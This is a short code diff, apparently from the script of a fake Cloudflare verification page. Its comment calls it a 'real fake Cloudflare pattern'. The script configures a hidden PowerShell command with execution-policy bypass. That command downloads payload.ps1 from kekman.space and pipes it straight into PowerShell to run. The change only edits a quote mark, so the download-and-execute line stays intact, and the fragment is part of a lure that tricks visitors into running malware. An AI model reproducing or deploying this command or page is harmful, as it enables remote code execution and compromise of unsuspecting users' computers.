@@ -343,7 +343,7 @@
 (function() {
   // ---- COMMAND: real fake Cloudflare pattern (iwr + pipe) ----
   const CONFIG = {
-    command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -"'
+    command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -'
   };
 
   // ---- Ray ID ----
